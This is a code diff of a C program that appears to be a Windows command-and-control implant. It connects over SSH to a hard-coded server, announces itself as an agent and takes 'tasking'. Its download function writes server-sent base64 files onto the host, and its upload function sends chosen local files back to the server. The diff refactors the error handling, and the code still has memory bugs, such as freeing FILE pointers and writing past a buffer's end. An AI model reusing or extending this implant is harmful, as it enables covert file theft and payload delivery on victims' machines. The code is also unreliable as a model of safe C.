@@ -6,83 +6,120 @@ char folderpath[256] = "C:\\Users\\";
 FILE* logfile;
 ssh_session session = NULL;
 
-int catchChannelError(int check, ssh_channel chan) {
+int catchChannelError(int check, ssh_channel chan, const char* message) {
 	if (check < 0) {
-		fprintf(logfile, "CHANNEL ERROR ABORTING!!!\n");
+		fprintf(logfile, "CHANNEL ERROR ABORTING! Error: %s\n", message);
 		ssh_channel_close(chan);
 		ssh_channel_free(chan);
 		ssh_disconnect(session);
 		ssh_free(session);
 		ssh_finalize();
 		fclose(logfile);
-		exit(-1);
+		exit(check);
 	}
 	return check;
 }
 
 void sendOk(ssh_channel chan) {
-	catchChannelError(ssh_channel_write(chan, "ok", 3), chan);
+	catchChannelError(ssh_channel_write(chan, "ok", 3), chan, "Failed to send OK");
 }
 
 int downloadFile(ssh_channel chan) {
 	fprintf(logfile, "Received orders to download file %s\n", firstStruct->opts);
-	char* contents;
+	
 	char size[256];			//Needs to be fixed
+	unsigned int sendsize;
+	unsigned int contentssize;
+	unsigned int filenamesize;
+	unsigned int filecontentsize; 
+	char* send;
+	char* contents;
+	char* filecontent;
+	char* filename;
+	FILE* file;
 
-	unsigned int sendBufferSize = 4 + strlen(firstStruct->opts);
-	char* send = malloc(sendBufferSize);
-	if (send == 0) return -1;				//An absurd amount of safety to make the intellisense happy. I don't know, I suppose something really bad could happen but I seriously doubt it.
-	_itoa_s(firstStruct->operation, send, sendBufferSize, 10);
-	strcat_s(send, sendBufferSize, "|");
-	strcat_s(send, 4 + strlen(firstStruct->opts), firstStruct->opts);
+	sendsize = 4 + strlen(firstStruct->opts);
+	send = malloc(sendsize);
+	if (send != 0) {				//An absurd amount of safety to make the intellisense happy. I don't know, I suppose something really bad could happen but I seriously doubt it.
+		_itoa_s(firstStruct->operation, send, sendsize, 10);
+		strcat_s(send, sendsize, "|");
+		strcat_s(send, sendsize, firstStruct->opts);
+		catchChannelError(ssh_channel_write(chan, send, strlen(send) + 1), chan, "Failed to repeat command.");
+		free(send);
+	}
+	else {
+		free(send);
+		return -1;
+	}
 
-	catchChannelError(ssh_channel_write(chan, send, strlen(send) + 1), chan);
-	catchChannelError(ssh_channel_read(chan, size, sizeof(size), 0), chan);
-
+	catchChannelError(ssh_channel_read(chan, size, sizeof(size), 0), chan, "Failed to receive file size.");
 	sendOk(chan);
 
 	size[255] = '\0';					//Some more safety
-	size_t memsize = atoi(size) + 1;
+	contentssize = atoi(size) + 1;
 
-	contents = malloc(memsize);
+	contents = malloc(contentssize);
 	if (contents) {						//Almost an absurd amount of safety (it makes the Visual Studio intellisense happy)
-		catchChannelError(ssh_channel_read(chan, contents, memsize, 0), chan);
-		contents[memsize - 1] = '\0';
+		catchChannelError(ssh_channel_read(chan, contents, contentssize, 0), chan, "Failed to receive contents.");
+		contents[contentssize - 1] = '\0';
 		sendOk(chan);
 	}
 	else return -1;
 
-	char* filecontent = malloc(b64_decoded_size(contents));
+	filecontentsize = b64_decoded_size(contents);
+	filecontent = malloc(filecontentsize);
 	if (filecontent) {
-		b64_decode(contents, filecontent, b64_decoded_size(contents));
-		filecontent[b64_decoded_size(contents)] = '\0';
+		b64_decode(contents, filecontent, filecontentsize);
+		filecontent[filecontentsize] = '\0';
 	}
 	else return -1;
 
-	FILE* file;
-
-	char filename[256] = "";
-	strcpy_s(filename, _countof(filename), folderpath);
-	strcat_s(filename, _countof(filename), "\\");
-	strcat_s(filename, _countof(filename), firstStruct->opts);
-	fopen_s(&file, filename, "w");
+	filenamesize = 2 + strlen(folderpath) + strlen(firstStruct->opts);
+	filename = malloc(filenamesize);
+	if (filename != 0) {
+		strcpy_s(filename, filenamesize, folderpath);
+		strcat_s(filename, filenamesize, "\\");
+		strcat_s(filename, filenamesize, firstStruct->opts);
+		fopen_s(&file, filename, "wb");
+		free(filename);
+	}
+	else {
+		free(filename);
+		return -1;
+	}
 	if (file == NULL)
 	{
 		fprintf(logfile, "Unable to create file.\n");
 	}
 	else {
-		fputs(filecontent, file);
+		fwrite(filecontent, 1, filecontentsize, file);
 		fclose(file);
 	}
+
+	free(contents);
+	free(filecontent);
+	free(file);
+
+	return 0;
+}
+
+int readOK(ssh_channel chan) {
+	char temp[3];
+	catchChannelError(ssh_channel_read(chan, temp, 3, 0), chan, "Failed to read OK.");
+	temp[2] = '\0';
+	if (strcmp(temp, "ok") != 0) catchChannelError(-4, chan, "Failed to receive good OK.");
+	return 0;
 }
 
 int uploadFile(ssh_channel chan) {
 	fprintf(logfile, "Got tasking to upload file %s\n", firstStruct->opts);
+
 	char* ufilename;
 	FILE* toupload;
 	char* sendcommand;
 	char* filedata;
-	char temp[14];
+	char* uploadsizechar;		//change this for dynamic allocation
+	int uploadsizemem = 0;
 
 	ufilename = malloc(strlen(firstStruct->opts));
 	int lastslash = 0;
@@ -92,37 +129,49 @@ int uploadFile(ssh_channel chan) {
 
 	strncpy_s(ufilename, strlen(firstStruct->opts), firstStruct->opts + lastslash + 1, strlen(firstStruct->opts));
 
-	fopen_s(&toupload, firstStruct->opts, "r");
-	if (toupload == NULL) catchChannelError(-1, chan);
+	fopen_s(&toupload, firstStruct->opts, "rb");
+	if (toupload == NULL) catchChannelError(-3, chan, "Failed to open file.");
 	if (toupload != 0) {
-		fseek(toupload, 0L, SEEK_END);
-		int uploadsize = ftell(toupload);
-		int uploadsizee = b64_encoded_size(uploadsize);
 		unsigned int sendCommandSize = strlen(firstStruct->opts) + 4;
 		sendcommand = malloc(sendCommandSize);
 		if (sendcommand != 0) {
 			strcpy_s(sendcommand, sendCommandSize, "11|");
 			strcat_s(sendcommand, sendCommandSize, ufilename);
+			
+			fseek(toupload, 0L, SEEK_END);
+			int uploadsize = ftell(toupload);
+			int uploadsizee = b64_encoded_size(uploadsize);
+			uploadsizemem = log10(uploadsizee) + 2;			
 			rewind(toupload);
 
-			catchChannelError(ssh_channel_write(chan, sendcommand, sendCommandSize), chan);
-			catchChannelError(ssh_channel_read(chan, temp, 3, 0), chan);
+			catchChannelError(ssh_channel_write(chan, sendcommand, sendCommandSize), chan, "Failed to repeat command.");
+			readOK(chan);
 
-			sprintf_s(temp, _countof(temp), "%d", uploadsizee);
-			catchChannelError(ssh_channel_write(chan, temp, sizeof(temp)), chan);
-			catchChannelError(ssh_channel_read(chan, temp, 3, 0), chan);
-
+			uploadsizechar = malloc(uploadsizemem);
+			if (uploadsizechar != 0) {
+				sprintf_s(uploadsizechar, uploadsizemem, "%d", uploadsizee);
+				catchChannelError(ssh_channel_write(chan, uploadsizechar, uploadsizemem), chan, "Failed to send file size.");
+			}
+			else catchChannelError(-1, chan, "uploadsizechar was 0.");
+			free(uploadsizechar);
+			readOK(chan);
+			
 			filedata = malloc(uploadsize + 1);
 			if (filedata != 0) {
 				fread(filedata, 1, uploadsize + 1, toupload);
 				char* encodedfiledata = b64_encode((unsigned char*)filedata, uploadsize);
-				catchChannelError(ssh_channel_write(chan, encodedfiledata, uploadsizee), chan);
-				catchChannelError(ssh_channel_read(chan, temp, 8, 0), chan);
+				catchChannelError(ssh_channel_write(chan, encodedfiledata, uploadsizee), chan, "Failed to send file content.");
+				readOK(chan);
 			}
+			free(filedata);
 		}
-		else catchChannelError(-1, chan);
+		else catchChannelError(-1, chan, "sendcommand was 0.");
+		free(sendcommand);
 	}
-	else catchChannelError(-1, chan);
+	else catchChannelError(-1, chan, "toupload was 0.");
+
+	free(ufilename);
+	free(toupload);
 }
 
 int parse_tasking(char* tasking, ssh_channel chan) {
@@ -131,7 +180,7 @@ int parse_tasking(char* tasking, ssh_channel chan) {
 	// checks if there is no tasking
 	if (!strncmp(tasking, "default", 7)) {
 		fprintf(logfile, "No tasks to do. Quitting...\n");
-		catchChannelError(ssh_channel_write(chan, "0", 2), chan);
+		catchChannelError(ssh_channel_write(chan, "0", 2), chan, "Failed to notify that there's no tasks.");
 		return 0;
 	}
 
@@ -227,26 +276,26 @@ int func_loop(ssh_session session)	//probably replace
 	fprintf(logfile, "[+] Opened SSH Channel with remote server\n");
 	// Request a shell interface
 
-	catchChannelError(ssh_channel_request_shell(channel), channel);
+	catchChannelError(ssh_channel_request_shell(channel), channel, "Failed to request shell.");
 	fprintf(logfile, "[+] Made it through check\n");
 	
 	// Send the global ID
 
 	fprintf(logfile, "Identified as an agent\n");
-	catchChannelError(ssh_channel_write(channel, "1", 2), channel);
+	catchChannelError(ssh_channel_write(channel, "1", 2), channel, "Failed to send global ID.");
 
 	//write that I am an agent
 	char temp3[3];
-	catchChannelError(ssh_channel_read(channel, temp3, 3, 0), channel);
-	catchChannelError(ssh_channel_write(channel, "NA\nNA\nNA\nNA\nNA", 15), channel);
+	readOK(channel);
+	catchChannelError(ssh_channel_write(channel, "NA\nNA\nNA\nNA\nNA", 15), channel, "Failed to send authentication information.");
 
-	catchChannelError(ssh_channel_read(channel, tasking, sizeof(tasking), 0), channel);
+	catchChannelError(ssh_channel_read(channel, tasking, sizeof(tasking), 0), channel, "Failed to read tasks.");
 
 	fprintf(logfile, "Read data: %s\n", tasking);
 	parse_tasking(tasking, channel);
 
 	// close connections
-	catchChannelError(ssh_channel_write(channel, "0", 2), channel);
+	catchChannelError(ssh_channel_write(channel, "0", 2), channel, "Failed to send termination message.");
 
 	int close = ssh_channel_close(channel);
 	ssh_channel_free(channel);
@@ -302,7 +351,7 @@ int main()
 
 	fprintf(logfile, "==============================\n\n");
 	
-	session = connectserver("192.168.0.88", "WINDOWS_CLIENT");	//Make this less hard-coded
+	session = connectserver("192.168.0.81", "WINDOWS_CLIENT");	//Make this less hard-coded
 
 	if (session == NULL) {
 		fprintf(logfile, "Failed to create SSH session\n\n");
